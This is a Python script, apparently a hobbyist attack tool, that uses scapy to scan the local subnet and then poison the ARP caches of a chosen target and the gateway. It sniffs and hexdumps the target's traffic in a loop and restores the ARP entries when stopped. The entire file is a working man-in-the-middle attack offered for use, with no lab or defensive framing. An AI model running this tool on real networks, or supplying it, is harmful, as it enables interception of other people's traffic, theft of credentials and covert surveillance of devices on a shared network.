#!/usr/bin/env python3

import scapy
import scapy.layers.l2
from scapy.config import conf
from colorama import Fore
import scapy.layers.inet
from scapy.sendrecv import send
from datetime import datetime
import time
from scapy.all import sniff,raw,hexdump
import pyfiglet

ascii_banner = pyfiglet.figlet_format("AUTHOR: JMOONJ\nARP-poisoning\nPacket capturing| TOOL")
print(ascii_banner)


def timing(x):
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    print(x, current_time)


def host_discovery(range):
    gw = conf.route.route("0.0.0.0")[2]
    print(Fore.BLUE + "Gateway :: ", gw)
    gw = gw + range
    print(Fore.GREEN + "List of Devices:")
    send_arp = scapy.layers.l2.arping(gw, timeout=4, verbose=1)


rge = str(input(Fore.GREEN + "Host_Discovery||range; example: /16 - /24 => "))
host_discovery(rge)


def hijack(target_ip, target_mac, source_ip):
    packet = scapy.layers.l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
    send(packet, verbose=0)
    capture = sniff(filter="host %s" % target_ip,count=10)  # You can add filter here
    capture.summary()
    print(Fore.WHITE + "*"*8 + "|HEXDUMP|" + "*"*8)
    pckt = capture[0]
    pckt_raw = raw(pckt)
    hexdump(pckt_raw)



def hijack_stop(target_ip, target_mac, source_ip, source_mac):
    packet = scapy.layers.l2.ARP(op=2, hwsrc=source_mac, psrc=source_ip, hwdst=target_mac, pdst=target_ip)
    send(packet, verbose=0)

try:
    t_ip = str(input("Target IP: "))
    t_mac = str(input("Target MAC: "))
    gateway = str(input("Gateway IP: "))
    gateway_mac = str(input("Gateway MAC: "))
except KeyboardInterrupt:
    print(Fore.RED + "\nTerminated")
    quit()
try:
    timing(x=Fore.GREEN + "Started= ")
    print(Fore.WHITE + "ARP Poisoning launched...\nAlso sniffing...")
    while True:
        hijack(t_ip, t_mac, gateway)
        hijack(gateway, gateway_mac, t_ip)
        time.sleep(8)   # You can change this, lower value can make connection issue
except KeyboardInterrupt:
    print(Fore.RED + "ARP spoofing terminated")
    timing(x="Finished= ")
    hijack_stop(gateway, gateway_mac, t_ip, t_mac)
    hijack_stop(t_ip, t_mac, gateway, gateway_mac)
    print(Fore.RED + "All set default")
    quit()
